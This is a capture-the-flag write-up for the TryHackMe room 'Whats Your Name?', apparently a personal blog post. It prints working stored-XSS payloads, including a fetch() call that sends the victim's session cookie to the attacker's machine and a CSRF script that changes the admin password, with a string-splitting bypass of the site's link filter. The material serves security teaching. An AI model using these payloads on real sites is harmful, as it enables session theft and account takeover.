---
title: "Whats Your Name?"
date: 2026-10-31 17:47:21 +0700
categories: ["TryHackMe", "Challenge"]
tags: ["tryhackme"]
description: "Utilise your client-side exploitation skills to take control of a web app."
toc: true
comments: false
---

![image-1900](/assets/img/obsidian/whats-your-name/image-1900.png)

# Questions

![image-1901](/assets/img/obsidian/whats-your-name/image-1901.png)

---

# Setup 

add `worldwap.thm` in /etc/hosts

![image-1924](/assets/img/obsidian/whats-your-name/image-1924.png)

# Enumerate and Scanning

using `nmap`

![image-1925](/assets/img/obsidian/whats-your-name/image-1925.png)

Only ssh and http ports were opened.

So, let's open the website.

![image-1904](/assets/img/obsidian/whats-your-name/image-1904.png)

**View Source**

![image-1905](/assets/img/obsidian/whats-your-name/image-1905.png)


![image-1913](/assets/img/obsidian/whats-your-name/image-1913.png)

![image-1914](/assets/img/obsidian/whats-your-name/image-1914.png)

If role = moderator -> admin.php if not -> dashboard.php


# Get Moderator Role

Let's visit register page

![image-1906](/assets/img/obsidian/whats-your-name/image-1906.png)

Let's try inject XSS with simple payload 

```
<script src="http://MACHINE_IP/test"></script> 
```

to check if we can use payload in each input field.

![image-1926](/assets/img/obsidian/whats-your-name/image-1926.png)
![image-1918](/assets/img/obsidian/whats-your-name/image-1918.png)


Just change username to something shorter
![image-1928](/assets/img/obsidian/whats-your-name/image-1928.png)

Now, it success.

Create php server to check, which field is working

`php -S 0.0.0.0:80`

![image-1929](/assets/img/obsidian/whats-your-name/image-1929.png)

It seem like every input field except password can inject XSS payload. Next, let steal the moderator cookie session to access to the `dashboard.php`

**Payload** : 

```
<script>fetch("http://MACHINE_IP?cookie="+ btoa(document.cookie),{method: "GET"});</script>
```

![image-1931](/assets/img/obsidian/whats-your-name/image-1931.png)

After register, look at the log and we will see the cookie session.

![image-1932](/assets/img/obsidian/whats-your-name/image-1932.png)

`UEhQU0VTU0lEPTkwcWlrdmo4Z2ZjaWxqNXNicmZuNmk4Njhx`

Which encoded with base64. Let's decode this.

![image-1933](/assets/img/obsidian/whats-your-name/image-1933.png)

Now, we got the PHPSESSID of moderator.

![image-1934](/assets/img/obsidian/whats-your-name/image-1934.png)

Change the value of PHPSESSID to the one we got.

![image-1935](/assets/img/obsidian/whats-your-name/image-1935.png)

After reload the `worldwap.thm` it redirect to `dashboard.php`. There are information about a subdomain `login.worldwap.thm`.

So, let's add this domain name to our `/etc/hosts` first

![image-1936](/assets/img/obsidian/whats-your-name/image-1936.png)

Then visit the website.

![image-1911](/assets/img/obsidian/whats-your-name/image-1911.png)

This is the hint that we have to visit `http://login.worldwap.thm/login.php`

![image-1937](/assets/img/obsidian/whats-your-name/image-1937.png)

With our moderator session, we now access to moderator `profile.php` and found our first flag.

# Get Admin Role

Investigate pages we can access.

Change password:

![image-1938](/assets/img/obsidian/whats-your-name/image-1938.png)

Chat with Admin:

![image-1940](/assets/img/obsidian/whats-your-name/image-1940.png)

This is interesting. Let's try inject simple XSS to see if it work or not.

```
<script>alert(1)</script>
```

![image-1942](/assets/img/obsidian/whats-your-name/image-1942.png)

XSS worked!

So, let's inspect the page further and we don't see any CSRF protection like CSRF tokens.

Let's craft script to inject XSS to send request to the change password with our new_password = hacked

```
<script>
    window.onload = function() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://login.worldwap.thm/change_password.php';
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'new_password';
        input.value = 'hacked';
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    };
</script>
```

It seem like it not working. Click view source to see what happen.

![image-1943](/assets/img/obsidian/whats-your-name/image-1943.png)

 we see that the HTTP URL we submit gets automatically formatted to `<a href...>`.

So, let's modify our payload little bit to bypass this detection.

```
<script>
    window.onload = function() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'ht'+'tp://'+'login.worldwap.thm/change_password.php';
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'new_password';
        input.value = 'hacked';
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    };
</script>
```


If it work, we will redirect to the change password page

![image-1945](/assets/img/obsidian/whats-your-name/image-1945.png)

It worked! Now, let's try login with our new password

![image-1946](/assets/img/obsidian/whats-your-name/image-1946.png)

![image-1947](/assets/img/obsidian/whats-your-name/image-1947.png)


Finally, we get access to admin account and get the last flag!

*DONE!!!*

---
